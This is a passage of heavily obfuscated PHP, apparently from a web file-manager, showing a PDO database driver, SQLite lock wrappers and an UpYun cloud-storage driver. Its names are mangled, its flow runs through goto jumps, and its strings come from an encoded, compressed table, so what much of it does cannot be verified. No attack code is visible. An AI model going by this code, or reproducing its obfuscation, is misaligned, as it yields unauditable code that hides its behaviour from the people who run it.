array($Çˆ”—Å¨[7], $îºîàÚÊ)); $ÌË´›êİ = Model($Çˆ”—Å¨[1405])->where($Â§åˆûÀ)->field($Çˆ”—Å¨[193])->select(); if (!$ÌË´›êİ) { return Model($Çˆ”—Å¨[544])->remove($îºîàÚÊ); } $ÌË´›êİ = array_to_keyvalue($ÌË´›êİ, $Çˆ”—Å¨[12], $Çˆ”—Å¨[193]); foreach ($ÌË´›êİ as $ÂéÚ¤ÈÇ) { Model($Çˆ”—Å¨[884])->removeNow($ÂéÚ¤ÈÇ, !1); } } private function removeShareItems($ü¡Ü·¨¾) { $†ì³°¶¾ =& $_SERVER[óÔë„ú]; $öó¸ôáµ = "\x7b\x69\157\72{$ü¡Ü·¨¾}\175\x2f"; $îŞÏÖŸ = array($†ì³°¶¾[193] => 0, $†ì³°¶¾[1242] => array($†ì³°¶¾[459], "{$öó¸ôáµ}\x25")); $¦°ó±ùĞ = Model($†ì³°¶¾[1936])->where($îŞÏÖŸ)->field($†ì³°¶¾[665])->select(); if (empty($¦°ó±ùĞ)) { return; } $õ¶†úÂ¨ = array_to_keyvalue($¦°ó±ùĞ, $†ì³°¶¾[12], $†ì³°¶¾[665]); Model($†ì³°¶¾[664])->remove($õ¶†úÂ¨); } } goto C…É…”‚Ë¤; f’¦æºè“: $_SERVER[æÈËŒ÷È] = explode($_SERVER[óÔë„ú][680], gzinflate(substr($_SERVER[óÔë„ú][681], 10, -8))); $yjseqfgwnt = $_SERVER[óÔë„ú][682]; if (!$yjseqfgwnt) { die; } goto EÈŒÇ·ï÷ã; c“‚òÌí£ğ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ÍùâõÌš = '') { $§ØÇ¶º =& $_SERVER[óÔë„ú]; if (!class_exists($§ØÇ¶º[977])) { think_exception(think_lang($§ØÇ¶º[14]) . $§ØÇ¶º[978]); } if (!empty($ÍùâõÌš)) { $this->config = $ÍùâõÌš; if (empty($this->config[$§ØÇ¶º[17]])) { $this->config[$§ØÇ¶º[17]] = array(); } } } public function connect($ğ®¿­½º = '', $İ¡’…Ü‰ = 0) { $³œÑ Ğ =& $_SERVER[óÔë„ú]; if (!isset($this->linkID[$İ¡’…Ü‰])) { if (empty($ğ®¿­½º)) { $ğ®¿­½º = $this->config; } $òšœ¸Í = !empty($ğ®¿­½º[$³œÑ Ğ[17]][$³œÑ Ğ[18]]) ? $ğ®¿­½º[$³œÑ Ğ[17]][$³œÑ Ğ[18]] : $this->pconnect; if ($òšœ¸Í) { $ğ®¿­½º[$³œÑ Ğ[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$İ¡’…Ü‰] = new PDO($ğ®¿­½º[$³œÑ Ğ[979]], $ğ®¿­½º[$³œÑ Ğ[951]], $ğ®¿­½º[$³œÑ Ğ[952]], $ğ®¿­½º[$³œÑ Ğ[17]]); } catch (PDOException $›¥ù…£) { think_exception($›¥ù…£->getMessage()); } $this->dbType = $this->_getDsnType($ğ®¿­½º[$³œÑ Ğ[979]]); if (in_array($this->dbType, array($³œÑ Ğ[980], $³œÑ Ğ[981], $³œÑ Ğ[982], $³œÑ Ğ[983]))) { think_exception($³œÑ Ğ[984] . $this->dbType . $³œÑ Ğ[985] . $this->dbType . $³œÑ Ğ[986]); } if (!$this->linkID[$İ¡’…Ü‰]) { think_exception($³œÑ Ğ[987]); } try { $this->linkID[$İ¡’…Ü‰]->exec($³œÑ Ğ[988] . think_config($³œÑ Ğ[954])); } catch (Exception $›¥ù…£) { } $this->connected = !0; if (1 != think_config($³œÑ Ğ[22])) { unset($this->config); } } return $this->linkID[$İ¡’…Ü‰]; } public function free() { $this->PDOStatement = null; } public function query($•ÓÒå¤, $ã²ğ¼ç… = array()) { $¡şî„‘  =& $_SERVER[óÔë„ú]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $•ÓÒå¤; if (!empty($ã²ğ¼ç…)) { $this->queryStr .= $¡şî„‘ [989] . print_r($ã²ğ¼ç…, !0) . $¡şî„‘ [990]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($¡şî„‘ [23], 1); think_status($¡şî„‘ [24]); $this->PDOStatement = $this->_linkID->prepare($•ÓÒå¤); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¼¨ÇöäÈ = $this->PDOStatement->execute($ã²ğ¼ç…); $this->debug(); if (!1 === $¼¨ÇöäÈ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($˜¯Ÿ”Äş, $ ¤Õè•Ã = array()) { $â©ÌØ¿ó =& $_SERVER[óÔë„ú]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $˜¯Ÿ”Äş; if (!empty($ ¤Õè•Ã)) { $this->queryStr .= $â©ÌØ¿ó[989] . print_r($ ¤Õè•Ã, !0) . $â©ÌØ¿ó[990]; } $¯‘Ş¤‘Í = !1; if ($this->dbType == $â©ÌØ¿ó[983]) { if (preg_match($â©ÌØ¿ó[991], $this->queryStr, $€êØ¢•ˆ)) { $this->table = think_config($â©ÌØ¿ó[992]) . str_ireplace(think_config($â©ÌØ¿ó[993]), $â©ÌØ¿ó[454], $€êØ¢•ˆ[2]); $¯‘Ş¤‘Í = (bool) $this->query($â©ÌØ¿ó[994] . strtoupper($this->table) . $â©ÌØ¿ó[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($â©ÌØ¿ó[25], 1); think_status($â©ÌØ¿ó[24]); $this->PDOStatement = $this->_linkID->prepare($˜¯Ÿ”Äş); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $çğ¯ã÷Ã = $this->PDOStatement->execute($ ¤Õè•Ã); $this->debug(); if (!1 === $çğ¯ã÷Ã) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($¯‘Ş¤‘Í || preg_match($â©ÌØ¿ó[995], $˜¯Ÿ”Äş)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÍÖ¸Ÿ×æ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ÍÖ¸Ÿ×æ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $÷µ¸şéî = $this->_linkID->rollback(); $this->transTimes = 0; if (!$÷µ¸şéî) { $this->error(); return !1; } } return !0; } private function getAll() { $ÛÄàæà = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ÛÄàæà); return $ÛÄàæà; } public function getFields($ÙäÈ³ò) { $ÒÛ¾§ =& $_SERVER[óÔë„ú]; $this->initConnect(!0); if (think_config($ÒÛ¾§[996])) { $–ßºÊÎ = str_replace($ÒÛ¾§[997], $ÙäÈ³ò, think_config($ÒÛ¾§[996])); } else { switch ($this->dbType) { case $ÒÛ¾§[980]: case $ÒÛ¾§[998]: $–ßºÊÎ = "\x53\105\114\105\x43\124\x20\40\40\x63\157\154\x75\155\x6e\137\x6e\141\155\x65\40\x61\x73\40\47\x4e\x61\155\145\x27\54\x20\40\x20\x64\x61\x74\141\137\x74\x79\x70\x65\x20\x61\x73\40\47\x54\x79\160\145\47\54\x20\x20\x20\143\157\x6c\165\x6d\x6e\x5f\144\145\146\x61\165\x6c\164\x20\141\163\40\47\x44\145\x66\x61\165\154\164\x27\x2c\x20\x20\x20\x69\x73\137\156\x75\154\x6c\x61\x62\x6c\145\x20\x61\163\x20\47\116\165\x6c\154\47\12\x9\x9\106\122\117\x4d\11\x69\x6e\x66\x6f\162\x6d\141\164\x69\157\x6e\137\163\143\150\145\x6d\141\x2e\164\x61\142\154\x65\x73\40\101\123\40\x74\12\11\11\112\117\111\116\x9\x69\x6e\146\x6f\162\x6d\141\164\x69\157\156\x5f\x73\x63\150\145\x6d\x61\56\x63\157\154\165\x6d\156\x73\40\x41\123\x20\x63\xa\11\11\117\116\40\x20\x74\x2e\164\141\142\154\x65\x5f\143\141\x74\x61\x6c\x6f\147\x20\75\x20\x63\56\164\x61\x62\154\145\137\143\141\164\141\154\x6f\147\12\11\11\101\x4e\x44\40\x74\56\x74\141\x62\x6c\145\x5f\x73\x63\x68\145\155\x61\x20\75\40\x63\56\x74\x61\142\154\x65\x5f\x73\143\x68\145\x6d\141\xa\x9\x9\x41\116\x44\40\164\x2e\164\x61\x62\x6c\145\137\x6e\141\x6d\x65\40\x3d\x20\143\56\164\x61\x62\154\x65\x5f\156\141\x6d\145\xa\x9\11\127\x48\105\122\x45\40\40\40\x74\x2e\164\141\142\x6c\145\x5f\x6e\141\x6d\x65\40\x3d\x20\x27{$ÙäÈ³ò}\x27"; break; case $ÒÛ¾§[999]: $–ßºÊÎ = $ÒÛ¾§[1000] . $ÙäÈ³ò . $ÒÛ¾§[1001]; break; case $ÒÛ¾§[981]: case $ÒÛ¾§[983]: $–ßºÊÎ = $ÒÛ¾§[1002] . $ÒÛ¾§[1003] . $ÒÛ¾§[1004] . strtoupper($ÙäÈ³ò) . $ÒÛ¾§[1005] . strtoupper($ÙäÈ³ò) . $ÒÛ¾§[1006]; break; case $ÒÛ¾§[1007]: $–ßºÊÎ = $ÒÛ¾§[1008] . $ÙäÈ³ò . $ÒÛ¾§[1009]; break; case $ÒÛ¾§[982]: break; case $ÒÛ¾§[1010]: default: $–ßºÊÎ = $ÒÛ¾§[1011] . ($this->dbType == $ÒÛ¾§[1010] ? "\140{$ÙäÈ³ò}\140" : $ÙäÈ³ò); } } $Š¿×ãùó = $this->query($–ßºÊÎ); $øõĞáùÀ = array(); if ($Š¿×ãùó) { foreach ($Š¿×ãùó as $Í¡éˆ²× => $ÏÃ©÷À¼) { $ÏÃ©÷À¼ = array_change_key_case($ÏÃ©÷À¼); $ÏÃ©÷À¼[$ÒÛ¾§[32]] = isset($ÏÃ©÷À¼[$ÒÛ¾§[32]]) ? $ÏÃ©÷À¼[$ÒÛ¾§[32]] : $ÒÛ¾§[454]; $ÏÃ©÷À¼[$ÒÛ¾§[33]] = isset($ÏÃ©÷À¼[$ÒÛ¾§[33]]) ? $ÏÃ©÷À¼[$ÒÛ¾§[33]] : $ÒÛ¾§[454]; $à†ÁÔö = isset($ÏÃ©÷À¼[$ÒÛ¾§[350]]) ? $ÏÃ©÷À¼[$ÒÛ¾§[350]] : $ÏÃ©÷À¼[$ÒÛ¾§[32]]; $øõĞáùÀ[$à†ÁÔö] = array($ÒÛ¾§[32] => $à†ÁÔö, $ÒÛ¾§[33] => $ÏÃ©÷À¼[$ÒÛ¾§[33]], $ÒÛ¾§[35] => (bool) (isset($ÏÃ©÷À¼[$ÒÛ¾§[106]]) && $ÏÃ©÷À¼[$ÒÛ¾§[106]] === $ÒÛ¾§[12] || isset($ÏÃ©÷À¼[$ÒÛ¾§[35]]) && $ÏÃ©÷À¼[$ÒÛ¾§[35]] === $ÒÛ¾§[12]), $ÒÛ¾§[37] => isset($ÏÃ©÷À¼[$ÒÛ¾§[37]]) ? $ÏÃ©÷À¼[$ÒÛ¾§[37]] : (isset($ÏÃ©÷À¼[$ÒÛ¾§[56]]) ? $ÏÃ©÷À¼[$ÒÛ¾§[56]] : $ÒÛ¾§[454]), $ÒÛ¾§[39] => isset($ÏÃ©÷À¼[$ÒÛ¾§[97]]) ? strtolower($ÏÃ©÷À¼[$ÒÛ¾§[97]]) == $ÒÛ¾§[41] : (isset($ÏÃ©÷À¼[$ÒÛ¾§[57]]) ? $ÏÃ©÷À¼[$ÒÛ¾§[57]] : !1), $ÒÛ¾§[42] => isset($ÏÃ©÷À¼[$ÒÛ¾§[1012]]) ? strtolower($ÏÃ©÷À¼[$ÒÛ¾§[1012]]) == $ÒÛ¾§[44] : (isset($ÏÃ©÷À¼[$ÒÛ¾§[97]]) ? $ÏÃ©÷À¼[$ÒÛ¾§[97]] : !1)); } } return $øõĞáùÀ; } public function getTables($›Šïº­Æ = '') { $ì¸ûÛñü =& $_SERVER[óÔë„ú]; if (think_config($ì¸ûÛñü[1013])) { $ªŠ³„é  = str_replace($ì¸ûÛñü[1014], $›Šïº­Æ, think_config($ì¸ûÛñü[1013])); } else { switch ($this->dbType) { case $ì¸ûÛñü[981]: case $ì¸ûÛñü[983]: $ªŠ³„é  = $ì¸ûÛñü[1015]; break; case $ì¸ûÛñü[980]: case $ì¸ûÛñü[998]: $ªŠ³„é  = $ì¸ûÛñü[1016]; break; case $ì¸ûÛñü[1007]: $ªŠ³„é  = $ì¸ûÛñü[1017]; break; case $ì¸ûÛñü[982]: think_exception(think_lang($ì¸ûÛñü[1018]) . $ì¸ûÛñü[1019]); break; case $ì¸ûÛñü[999]: $ªŠ³„é  = $ì¸ûÛñü[45] . $ì¸ûÛñü[46] . $ì¸ûÛñü[47]; break; case $ì¸ûÛñü[1010]: default: if (!empty($›Šïº­Æ)) { $ªŠ³„é  = $ì¸ûÛñü[962] . $›Šïº­Æ . $ì¸ûÛñü[963]; } else { $ªŠ³„é  = $ì¸ûÛñü[964]; } } } $« Ì‘ŸÁ = $this->query($ªŠ³„é ); $ä£Ââ = array(); foreach ($« Ì‘ŸÁ as $æüç¡êø => $îöù“¶) { $ä£Ââ[$æüç¡êø] = current($îöù“¶); } return $ä£Ââ; } protected function parseLimit($§äÏöË£) { $íïùì© =& $_SERVER[óÔë„ú]; $İû™› = $íïùì©[12]; if (!empty($§äÏöË£)) { switch ($this->dbType) { case $íïùì©[1007]: case $íïùì©[999]: $§äÏöË£ = explode($íïùì©[50], $§äÏöË£); if (count($§äÏöË£) > 1) { $İû™› .= $íïùì©[51] . $§äÏöË£[1] . $íïùì©[52] . $§äÏöË£[0] . $íïùì©[53]; } else { $İû™› .= $íïùì©[51] . $§äÏöË£[0] . $íïùì©[53]; } break; case $íïùì©[980]: case $íïùì©[998]: break; case $íïùì©[982]: break; case $íïùì©[981]: case $íïùì©[983]: break; case $íïùì©[1010]: default: $İû™› .= $íïùì©[51] . $§äÏöË£ . $íïùì©[53]; } } return $İû™›; } public function parseKey(&$”¼øŠ“é, $Îô¼¹„¨ = true) { $©ÀÎÍªÃ =& $_SERVER[óÔë„ú]; if ($Îô¼¹„¨) { $”¼øŠ“é = $this->parseKeyCheck($”¼øŠ“é); } if ($this->dbType == $©ÀÎÍªÃ[1010]) { if ($”¼øŠ“é != $©ÀÎÍªÃ[220] && !preg_match($©ÀÎÍªÃ[974], $”¼øŠ“é)) { $”¼øŠ“é = $©ÀÎÍªÃ[461] . trim($”¼øŠ“é, $©ÀÎÍªÃ[461]) . $©ÀÎÍªÃ[461]; } return $”¼øŠ“é; } else { return parent::parseKey($”¼øŠ“é, $Îô¼¹„¨); } } public function close() { $this->_linkID = null; } public function error() { $°ÜĞ¢µï =& $_SERVER[óÔë„ú]; if ($this->PDOStatement) { $õš¶‘«÷ = $this->PDOStatement->errorInfo(); $this->error = $õš¶‘«÷[1] . $°ÜĞ¢µï[4] . $õš¶‘«÷[2]; } else { $this->error = $°ÜĞ¢µï[12]; } if ($°ÜĞ¢µï[12] != $this->queryStr) { $this->error .= LNG($°ÜĞ¢µï[48]) . $this->queryStr; } think_trace($this->error, $°ÜĞ¢µï[12], $°ÜĞ¢µï[49]); return $this->error; } public function escapeString($ÚÕËœ¾) { $ª§ Û†• =& $_SERVER[óÔë„ú]; switch ($this->dbType) { case $ª§ Û†•[1007]: case $ª§ Û†•[980]: case $ª§ Û†•[998]: case $ª§ Û†•[1010]: return addslashes($ÚÕËœ¾); case $ª§ Û†•[982]: case $ª§ Û†•[999]: case $ª§ Û†•[981]: case $ª§ Û†•[983]: return str_ireplace($ª§ Û†•[58], $ª§ Û†•[59], $ÚÕËœ¾); } } protected function parseValue($ÍÉÉâ¡ú) { $ê’´øöô =& $_SERVER[óÔë„ú]; if (is_string($ÍÉÉâ¡ú)) { $±·ï¡œİ = strpos($ÍÉÉâ¡ú, $ê’´øöô[4]) === 0 && in_array($ÍÉÉâ¡ú, array_keys($this->bind)); $ÍÉÉâ¡ú = $±·ï¡œİ ? $this->escapeString($ÍÉÉâ¡ú) : $ê’´øöô[1020] . $this->escapeString($ÍÉÉâ¡ú) . $ê’´øöô[1020]; } elseif (isset($ÍÉÉâ¡ú[0]) && is_string($ÍÉÉâ¡ú[0]) && strtolower($ÍÉÉâ¡ú[0]) == $ê’´øöô[373]) { $ÍÉÉâ¡ú = $this->escapeString($ÍÉÉâ¡ú[1]); } elseif (is_array($ÍÉÉâ¡ú)) { $ÍÉÉâ¡ú = array_map(array($this, $ê’´øöô[1021]), $ÍÉÉâ¡ú); } elseif (is_bool($ÍÉÉâ¡ú)) { $ÍÉÉâ¡ú = $ÍÉÉâ¡ú ? $ê’´øöô[91] : $ê’´øöô[228]; } elseif (is_null($ÍÉÉâ¡ú)) { $ÍÉÉâ¡ú = $ê’´øöô[106]; } return $ÍÉÉâ¡ú; } public function getLastInsertId() { $‚ œÕìø =& $_SERVER[óÔë„ú]; switch ($this->dbType) { case $‚ œÕìø[1007]: case $‚ œÕìø[999]: case $‚ œÕìø[980]: case $‚ œÕìø[998]: case $‚ œÕìø[982]: case $‚ œÕìø[1010]: return $this->_linkID->lastInsertId(); case $‚ œÕìø[981]: case $‚ œÕìø[983]: $–éüŒÈí = $this->table; $‹¹Ûòü  = $this->query("\x53\105\x4c\105\103\x54\x20{$–éüŒÈí}\x2e\x63\165\162\x72\166\141\154\x20\x63\x75\162\x72\x76\x61\x6c\x20\x46\122\117\x4d\40\144\165\x61\x6c"); return $‹¹Ûòü  ? $‹¹Ûòü [0][$‚ œÕìø[1022]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($¼Å‡£“…) { $¢¿…à„° =& $_SERVER[óÔë„ú]; if (!CacheLock::fileLock($¢¿…à„°[13])) { return !1; } $¾Ö¼İš = parent::query($¼Å‡£“…); CacheLock::fileUnLock($¢¿…à„°[13]); return $¾Ö¼İš; } public function execute($Ø¡’•Ü ) { $î÷¼ˆ³Ù =& $_SERVER[óÔë„ú]; if (!CacheLock::fileLock($î÷¼ˆ³Ù[13])) { return !1; } $çÙ–¤Ë = parent::execute($Ø¡’•Ü ); CacheLock::fileUnLock($î÷¼ˆ³Ù[13]); return $çÙ–¤Ë; } } class DbSqlite3 extends DbSqlite3Base { public function query($ï²Æ±ì) { $Îø×Í‘€ =& $_SERVER[óÔë„ú]; if (!CacheLock::fileLock($Îø×Í‘€[13])) { return !1; } $¥¦Ã¾Í„ = parent::query($ï²Æ±ì); CacheLock::fileUnLock($Îø×Í‘€[13]); return $¥¦Ã¾Í„; } public function execute($‹óš–µ) { $Îó¶Üœ£ =& $_SERVER[óÔë„ú]; if (!CacheLock::fileLock($Îó¶Üœ£[13])) { return !1; } $—¯û‘õî = parent::execute($‹óš–µ); CacheLock::fileUnLock($Îó¶Üœ£[13]); return $—¯û‘õî; } } goto C¿¼‚ÒÎ©ä; FäãÆ¹‰Ÿ´: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\150\164\164\x70\72\57\57\166\x30\56\141\160\x69\56\x75\160\171\165\x6e\56\x63\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($µ°öÍİı) { parent::__construct(); $this->_init($µ°öÍİı); } public function _init($ ±¾ÊÒñ) { $‰ˆàÊ¢‰ =& $_SERVER[óÔë„ú]; foreach ($ ±¾ÊÒñ as $¤¿Ì·õÎ => $¸˜« ëø) { if (isset($this->{$¤¿Ì·õÎ})) { $this->{$¤¿Ì·õÎ} = $¸˜« ëø; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($‰ˆàÊ¢‰[1530] . LNG($‰ˆàÊ¢‰[1449])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ÔşŞØÇ˜, $¤Œ¤ù¶ä = "\x47\105\x54") { $ ØÂœ =& $_SERVER[óÔë„ú]; $¢Ô›õÅ = gmdate($ ØÂœ[1478]); $ ß†ª‹ = base64_encode(hash_hmac($ ØÂœ[1531], "{$¤Œ¤ù¶ä}\x26{$ÔşŞØÇ˜}\x26{$¢Ô›õÅ}", md5("{$this->userpass}"), !0)); $‹±ÀÅ¾ò = array("\101\165\x74\x68\157\162\x69\x7a\x61\164\x69\157\x6e\x3a\x55\x50\x59\125\116\40{$this->username}\x3a{$ ß†ª‹}", "\x44\141\164\145\x3a{$¢Ô›õÅ}"); return $‹±ÀÅ¾ò; } public function ussRequest($‰ÄÔ´, $¯¹÷úä¹ = "\107\x45\124", $ê©×ñÃ = false, $Õø—®–Œ = false, $êí˜æúÕ = false) { $•€ïˆÙ‹ =& $_SERVER[óÔë„ú]; $‰ÄÔ´ = trim($‰ÄÔ´, $•€ïˆÙ‹[8]); $çØÙÙ±µ = "\57{$this->bucket}\57{$‰ÄÔ´}"; $¤•…Ç¶½ = $this->ussHeaders($çØÙÙ±µ, $¯¹÷úä¹); if ($Õø—®–Œ) { $¤•…Ç¶½ = array_merge($¤•…Ç¶½, $Õø—®–Œ); } $ò¡©½›÷ = url_request($this->endpoint . $çØÙÙ±µ, $¯¹÷úä¹, $ê©×ñÃ, $¤•…Ç¶½, $êí˜æúÕ); if (!$ò¡©½›÷) { $â“Ì©· = LNG($•€ïˆÙ‹[1532]); $this->writeLog($â“Ì©·); return array($•€ïˆÙ‹[1284] => !1, $•€ïˆÙ‹[1274] => $â“Ì©·); } if (strtolower($¯¹÷úä¹) == $•€ïˆÙ‹[227] || in_array($ò¡©½›÷[$•€ïˆÙ‹[1284]], array($•€ïˆÙ‹[274], $•€ïˆÙ‹[1533]))) { $ê©×ñÃ = $ò¡©½›÷[$•€ïˆÙ‹[1534]]; } else { $ê©×ñÃ = json_decode($ò¡©½›÷[$•€ïˆÙ‹[1274]], !0); if (!$ê©×ñÃ) { $ê©×ñÃ = $ò¡©½›÷[$•€ïˆÙ‹[1274]]; } else { if (!$ò¡©½›÷[$•€ïˆÙ‹[810]] && isset($ê©×ñÃ[$•€ïˆÙ‹[1535]])) { $ê©×ñÃ = $ê©×ñÃ[$•€ïˆÙ‹[1535]]; } } } if (!$ò¡©½›÷[$•€ïˆÙ‹[810]]) { $this->writeLog($this->__errorMessage($ê©×ñÃ)); } return array($•€ïˆÙ‹[1284] => $ò¡©½›÷[$•€ïˆÙ‹[810]], $•€ïˆÙ‹[1274] => $ê©×ñÃ); } private function __errorMessage($¿¹Äâ¿ñ) { $ ²Ïå‰œ =& $_SERVER[óÔë„ú]; if (!$¿¹Äâ¿ñ) { return $ ²Ïå‰œ[12]; } static $¸ÇÌ¿­Ø = null; if (!$¸ÇÌ¿­Ø) { $¸ÇÌ¿­Ø = I18n::getType(); } if ($¸ÇÌ¿­Ø != $ ²Ïå‰œ[1488]) { return $¿¹Äâ¿ñ; } $³Ï¼ê Ò = array($ ²Ïå‰œ[1536] => $ ²Ïå‰œ[1537], $ ²Ïå‰œ[1538] => $ ²Ïå‰œ[1539], $ ²Ïå‰œ[1540] => $ ²Ïå‰œ[1539], $ ²Ïå‰œ[1541] => $ ²Ïå‰œ[1542], $ ²Ïå‰œ[1543] => $ ²Ïå‰œ[1544], $ ²Ïå‰œ[1545] => $ ²Ïå‰œ[1546], $ ²Ïå‰œ[1547] => $ ²Ïå‰œ[1548]); return isset($³Ï¼ê Ò[$¿¹Äâ¿ñ]) ? $³Ï¼ê Ò[$¿¹Äâ¿ñ] : $¿¹Äâ¿ñ; } public function mkfile($…²ò…ªé, $Š­Ç­ôŞ = '', $áê°™€ = REPEAT_RENAME) { if ($this->setContent($…²ò…ªé, $Š­Ç­ôŞ)) { return $this->getPathOuter($…²ò…ªé); } return !1; } public function mkdir($’›–…Óó, $ÎäŞ²â¬ = REPEAT_SKIP) { $–õÅ¿ò =& $_SERVER[óÔë„ú]; $şÄ¥œóÚ = trim($’›–…Óó, $–õÅ¿ò[8]); if ($this->_isFolder($şÄ¥œóÚ)) { return $this->getPathOuter($şÄ¥œóÚ); } $·îåÉ½® = array($–õÅ¿ò[1549]); $ë¦ŠÇ‘Å = $this->ussRequest($şÄ¥œóÚ, $–õÅ¿ò[257], !1, $·îåÉ½®); return $ë¦ŠÇ‘Å[$–õÅ¿ò[1284]] ? $this->getPathOuter($şÄ¥œóÚ) : !1; } public function copyFile($Õëª¿³¯, $Í¤Í·™ù) { $ìÅš¬ß› =& $_SERVER[óÔë„ú]; $®¥š´øÔ = array($ìÅš¬ß›[1550] . "\57{$this->bucket}\x2f{$Õëª¿³¯}", $ìÅš¬ß›[1551]); $ñİé•³Ò = $this->ussRequest($Í¤Í·™ù, $ìÅš¬ß›[259], !1, $®¥š´øÔ); return $ñİé•³Ò[$ìÅš¬ß›[1284]] ? !0 : $this->getPathOuter($Í¤Í·™ù); } public function moveFile($¡Òı´ãë, $ùÊë§ï×) { $ª¿ÂëÇÏ =& $_SERVER[óÔë„ú]; $ºñ´§È‚ = array($ª¿ÂëÇÏ[1552] . "\57{$this->bucket}\57{$¡Òı´ãë}", $ª¿ÂëÇÏ[1551]); $ÒÇöçÛµ = $this->ussRequest($ùÊë§ï×, $ª¿ÂëÇÏ[259], !1, $ºñ´§È‚); return $ÒÇöçÛµ[$ª¿ÂëÇÏ[1284]] ? !0 : $this->getPathOuter($ùÊë§ï×); } public function delFile($å…¼¥Ë) { $ßÅÌÍ¹× =& $_SERVER[óÔë„ú]; $ñ”Š‡ıÏ = $this->ussRequest($å…¼¥Ë, $ßÅÌÍ¹×[1553]); return $ñ”Š‡ıÏ[$ßÅÌÍ¹×[1284]] ? !0 : !1; } public function delFolder($ßÄ§è‹†) { $´šúê†À =& $_SERVER[óÔë„ú]; if (!$this->exist($ßÄ§è‹†)) { return !0; } $this->listItemCache = !1; $ÕÇéÛÉ“ = $Ÿ÷‘èÒÑ = array(); $this->fileList($ßÄ§è‹†, $ÕÇéÛÉ“, $Ÿ÷‘èÒÑ, !0); $this->listItemCache = !0; foreach ($Ÿ÷‘èÒÑ as $Ş¨ÕÛÕ™) { $Ê×¿×œ‹ = $this->ussRequest($Ş¨ÕÛÕ™[$´šúê†À[32]], $´šúê†À[1553]); if (!$Ê×¿×œ‹[$´šúê†À[1284]]) { return !1; } } foreach ($ÕÇéÛÉ“ as $éè’¨·¸) { $Ê×¿×œ‹ = $this->ussRequest($éè’¨·¸, $´šúê†À[1553]); if (!$Ê×¿×œ‹[$´šúê†À[1284]]) { return !1; } } $Ê×¿×œ‹ = $this->ussRequest($ßÄ§è‹†, $´šúê†À[1553]); return $Ê×¿×œ‹[$´šúê†À[1284]]; } public function rename($òøš¶öÓ, $ˆ°ãÌ³ï) { if ($this->isFile($òøš¶öÓ)) { $ˆ°ãÌ³ï = get_path_father($òøš¶öÓ) . $ˆ°ãÌ³ï; return $this->moveFile($òøš¶öÓ, $ˆ°ãÌ³ï); } return $this->renameObject($òøš¶öÓ, $ˆ°ãÌ³ï); } public function fileInfo($ù†Û´«¶, $ÁãùÇ‘¤ = false, $œÎßÏŞü = array()) { $™Íë°¶… =& $_SERVER[óÔë„ú]; $´»Ì¢ı = array($™Íë°¶…[32] => $this->pathThis($ù†Û´«¶), $™Íë°¶…[87] => $this->getPathOuter($™Íë°¶…[8] . $ù†Û´«¶), $™Íë°¶…[33] => $™Íë°¶…[230], $™Íë°¶…[79] => isset($œÎßÏŞü[$™Íë°¶…[79]]) ? $œÎßÏŞü[$™Íë°¶…[79]] : 0, $™Íë°¶…[169] => $this->ext($ù†Û´«¶)); if ($ÁãùÇ‘¤) { return $´»Ì¢ı; } $´»Ì¢ı[$™Íë°¶…[231]] = $´»Ì¢ı[$™Íë°¶…[88]] = 0; $´»Ì¢ı[$™Íë°¶…[232]] = $´»Ì¢ı[$™Íë°¶…[233]] = !0; if (empty($œÎßÏŞü)) { $œÎßÏŞü = $this->objectMeta($ù†Û´«¶); if (!$œÎßÏŞü) { return $´»Ì¢ı; } } $´»Ì¢ı[$™Íë°¶…[231]] = intval($œÎßÏŞü[$™Íë°¶…[1554]]); $´»Ì¢ı[$™Íë°¶…[88]] = intval($œÎßÏŞü[$™Íë°¶…[1555]]); $´»Ì¢ı[$™Íë°¶…[79]] = $œÎßÏŞü[$™Íë°¶…[79]]; return $´»Ì¢ı; } public function folderInfo($Ÿ¢ğ—ø¥, $ÂÒ‚ ¦¢ = false) { $©•¢Ò =& $_SERVER[óÔë„ú]; $ –àÈ— = array($©•¢Ò[32] => $this->pathThis($Ÿ¢ğ—ø¥), $©•¢Ò[87] => $this->getPathOuter($©•¢Ò[8] . $Ÿ¢ğ—ø¥), $©•¢Ò[33] => $©•¢Ò[78]); if ($ÂÒ‚ ¦¢) { return $ –àÈ—; } $ –àÈ—[$©•¢Ò[231]] = $ –àÈ—[$©•¢Ò[88]] = 0; $ –àÈ—[$©•¢Ò[232]] = $ –àÈ—[$©•¢Ò[233]] = !0; if (empty($–»Å€¸)) { $–»Å€¸ = $this->objectMeta($Ÿ¢ğ—ø¥); if (!$–»Å€¸) { return $ –àÈ—; } } $ –àÈ—[$©•¢Ò[231]] = intval($–»Å€¸[$©•¢Ò[1554]]); $ –àÈ—[$©•¢Ò[88]] = intval($–»Å€¸[$©•¢Ò[1555]]); return $ –àÈ—; } private function listObjs($Å±Äˆø, $Ä˜ğÑğ = 0, $ßîÂÀ¥Õ = 1000) { $ë¤ß”œò =& $_SERVER[óÔë„ú]; $òÉğèàµ = array($ë¤ß”œò[1556], $ë¤ß”œò[1557] . $ßîÂÀ¥Õ); if ($Ä˜ğÑğ) { $òÉğèàµ[] = $ë¤ß”œò[1558] . $Ä˜ğÑğ; } $—äğ¼ª× = 